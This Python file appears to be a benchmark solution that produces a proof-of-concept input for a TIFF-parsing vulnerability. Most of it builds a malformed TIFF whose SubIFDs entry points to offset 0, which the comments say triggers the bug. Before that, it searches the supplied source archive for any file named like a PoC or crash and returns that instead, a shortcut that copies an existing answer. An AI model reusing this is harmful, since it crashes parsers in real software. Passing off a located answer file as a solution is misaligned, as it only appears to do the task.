import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            with tarfile.open(src_path, 'r:*') as tar:
                for member in tar.getmembers():
                    name_lc = member.name.lower()
                    if any(x in name_lc for x in ('388571282', 'poc', 'crash', 'fail', 'bug')) and member.isfile():
                        f = tar.extractfile(member)
                        if f:
                            data = f.read()
                            if data:
                                return data
        except Exception:
            pass

        poc = (
            b'II'                  # Byte order: little-endian
            b'\x2A\x00'            # TIFF magic number
            b'\x08\x00\x00\x00'    # Offset to first IFD (8)
            b'\x03\x00'            # Number of directory entries (3)

            # Tag 256 (ImageWidth) - LONG, count 1, value 1
            b'\x00\x01'            # Tag ID
            b'\x04\x00'            # Type LONG
            b'\x01\x00\x00\x00'    # Count
            b'\x01\x00\x00\x00'    # Value

            # Tag 257 (ImageLength) - LONG, count 1, value 1
            b'\x01\x01'            # Tag ID
            b'\x04\x00'            # Type LONG
            b'\x01\x00\x00\x00'    # Count
            b'\x01\x00\x00\x00'    # Value

            # Tag 330 (SubIFDs) - LONG, count 1, offset 0 (invalid)
            b'\x4A\x01'            # Tag ID
            b'\x04\x00'            # Type LONG
            b'\x01\x00\x00\x00'    # Count
            b'\x00\x00\x00\x00'    # Offset (0 - triggers vulnerability)

            b'\x00\x00\x00\x00'    # Next IFD offset (none)
            + b'\x00' * (162 - 50) # Padding to reach 162 bytes total
        )
        return poc
